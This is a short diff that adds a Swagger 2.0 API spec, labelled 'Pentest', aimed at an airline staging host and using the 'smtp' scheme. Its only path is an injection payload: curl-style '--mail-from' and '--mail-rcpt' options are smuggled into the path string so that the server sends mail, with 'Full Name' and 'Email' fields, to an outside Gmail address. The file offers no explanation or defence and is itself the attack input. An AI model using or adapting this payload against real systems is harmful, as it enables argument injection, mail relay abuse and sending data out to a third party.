@@ -1,0 +1,40 @@
+{
+    "swagger": "2.0",
+    "info": {
+      "title": "AFK",
+      "description": "XYZ",
+      "version": "Pentest"
+    },
+    "host": "life.stgairasia.com",
+    "basePath": "/",
+    "schemes": [
+      "smtp"
+    ],
+    "paths": {
+      "/--mail-from root@life.stgairasia.com --mail-rcpt \
+netkartel@gmail.com": {
+        "get": {
+          "description": "Submit Details",
+          "operationId": "xyz",
+          "parameters": [
+            {
+              "name": "Full Name",
+              "in": "path",
+              "description": "Full Name",
+              "required": true
+              
+              
+            },
+            {
+              "name": "Email",
+              "in": "path",
+              "description": "@airasia.com",
+              "required": true
+              
+            }
+          ],
+          "responses": {}
+        }
+      }
+    }   
+}
